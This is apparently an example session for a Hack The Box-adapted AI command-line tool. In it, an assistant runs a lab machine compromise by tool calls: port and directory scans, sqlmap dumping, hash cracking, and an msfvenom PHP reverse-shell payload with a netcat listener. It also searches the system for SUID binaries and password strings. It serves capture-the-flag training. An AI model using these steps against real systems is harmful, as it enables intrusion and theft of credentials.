# HTB Challenge Example Session

This example demonstrates how to use the HTB-modified Gemini CLI to solve a typical Hack The Box challenge.

## Starting a Session

```bash
gemini
```

## Example Challenge Walkthrough

### Initial Reconnaissance

**User**: I need to hack the machine at 10.10.10.10. Start with initial reconnaissance.

**Assistant**: I'll help you perform initial reconnaissance on the target machine. Let me start with a comprehensive port scan to identify open services.

[tool_call: htb_scanner for scanType='nmap' target='10.10.10.10' options='-p- -T4']

### Web Enumeration

**User**: I see port 80 is open. Let's enumerate the web server.

**Assistant**: I'll enumerate the web server to find hidden directories and files.

[tool_call: htb_scanner for scanType='gobuster' target='http://10.10.10.10' wordlist='/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt' options='-x php,html,txt']

### SQL Injection Testing

**User**: I found a login page at /login.php. Test for SQL injection.

**Assistant**: I'll test the login form for SQL injection vulnerabilities.

[tool_call: htb_scanner for scanType='sqlmap' target='http://10.10.10.10/login.php' options='--forms --batch --dump']

### Password Cracking

**User**: I got some password hashes: 
```
admin:5f4dcc3b5aa765d61d8327deb882cf99
user1:e10adc3949ba59abbe56e057f20f883e
```

**Assistant**: These look like MD5 hashes. Let me crack them using hashcat with the rockyou wordlist.

First, let me save the hashes to a file:

[tool_call: run_shell_command for 'echo -e "5f4dcc3b5aa765d61d8327deb882cf99\ne10adc3949ba59abbe56e057f20f883e" > hashes.txt']

Now let's crack them:

[tool_call: htb_scanner for scanType='hashcat' hashFile='hashes.txt' options='-m 0' wordlist='/usr/share/wordlists/rockyou.txt']

### SMB Enumeration

**User**: I also see port 445 is open. Let's enumerate SMB.

**Assistant**: I'll enumerate the SMB service to look for shares, users, and potential vulnerabilities.

[tool_call: htb_scanner for scanType='enum4linux' target='10.10.10.10']

### Getting a Reverse Shell

**User**: I found credentials admin:password. The web server is running PHP. Get me a reverse shell.

**Assistant**: I'll help you get a reverse shell. First, let me set up a listener on your machine:

[tool_call: run_shell_command for 'nc -lvnp 4444' description='Starting netcat listener on port 4444']

Now, let me create a PHP reverse shell payload:

[tool_call: run_shell_command for 'msfvenom -p php/reverse_php LHOST=<your-ip> LPORT=4444 -f raw > shell.php']

### Privilege Escalation

**User**: I got a shell as www-data. Help me escalate to root.

**Assistant**: I'll help you escalate privileges. Let me check for common privilege escalation vectors:

First, let's check for SUID binaries:

[tool_call: run_shell_command for 'find / -perm -u=s -type f 2>/dev/null']

Check sudo privileges:

[tool_call: run_shell_command for 'sudo -l']

Look for interesting files:

[tool_call: grep_search for pattern='password|passwd|pwd' include_pattern='*.conf,*.txt,*.php']

### Finding Flags

**User**: I need to find the user and root flags.

**Assistant**: I'll help you locate the flags. HTB flags are typically in user home directories and /root:

[tool_call: run_shell_command for 'find /home -name user.txt 2>/dev/null']
[tool_call: run_shell_command for 'find /root -name root.txt 2>/dev/null']

## Tips for Using the HTB-Modified Gemini CLI

1. **Always start with enumeration**: The more information you gather, the better your attack strategy
2. **Use the HTB scanner tool**: It provides optimized defaults for common HTB scenarios
3. **Chain commands**: Use the shell tool for complex command chains and scripts
4. **Save your progress**: Use the memory tool to save important findings:
   ```
   [tool_call: save_memory for content='Admin credentials: admin:password']
   ```
5. **Document vulnerabilities**: Keep track of what worked for future reference

## Common HTB Patterns

- **Web servers**: Often vulnerable to SQL injection, file upload, or directory traversal
- **SMB shares**: May contain credentials or sensitive files
- **Outdated services**: Check version numbers against exploit databases
- **Weak passwords**: Always try common credentials and password spraying
- **Misconfigurations**: Look for writable directories, SUID binaries, and cron jobs 